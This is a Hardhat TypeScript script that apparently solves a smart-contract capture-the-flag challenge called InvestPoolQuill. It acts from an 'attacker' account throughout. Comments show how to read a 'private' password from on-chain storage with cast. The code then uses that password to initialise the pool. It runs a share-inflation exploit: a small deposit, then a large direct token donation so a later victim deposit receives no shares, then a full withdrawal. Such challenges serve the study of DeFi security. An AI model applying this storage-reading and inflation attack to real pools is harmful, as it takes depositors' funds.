import chalk from "chalk";
import { ethers } from "hardhat";
import { InvestPoolQuill__factory, SetupInvestQuill__factory, SetupInvestQuill, InvestPoolTokenQuill__factory } from "../../typechain";
import { log, initialize } from "../utils";


async function main() {
    let [investPoolSetup, attacker] = await initialize<SetupInvestQuill>(SetupInvestQuill__factory);
    let tx = await investPoolSetup.init();
    await tx.wait();

    let pool = InvestPoolQuill__factory.connect(await investPoolSetup.pool(), attacker);
    let token = InvestPoolTokenQuill__factory.connect(await investPoolSetup.token(), attacker);

    // fake
    // password: cast storage 0xA45aC53E355161f33fB00d3c9485C77be3c808ae 0 --rpc-url https://rpc.ankr.com/eth_goerli
    // cast call 0xA45aC53E355161f33fB00d3c9485C77be3c808ae "getPassword()" -r https://rpc.ankr.com/eth_goerli
    // https://playground.sourcify.dev/  -> https://ipfs.io/ipfs/QmU3YCRfRZ1bxDNnxB4LVNCUWLs26wVaqPoQSQ6RH2u86V
    let password = "j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx";
    tx = await pool.initialize(password);
    await tx.wait();
    
    tx = await token.approve(await pool.getAddress(), ethers.parseEther("1000"));
    await tx.wait();
    tx = await pool.deposit(ethers.parseEther("10"));
    await tx.wait();
    tx = await token.transfer(await pool.getAddress(), ethers.parseEther("990"));
    await tx.wait();
    // now tokenBalance is 1000 ether, tokenShares is 10 ether, so if user deposit amount < 100, he couldn't get any share.
    tx = await investPoolSetup.deposit(99);
    await tx.wait();
    tx = await pool.withdrawAll();
    await tx.wait();
    log(`Is solved: ${chalk.yellow(await investPoolSetup.isSolved())}`);
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});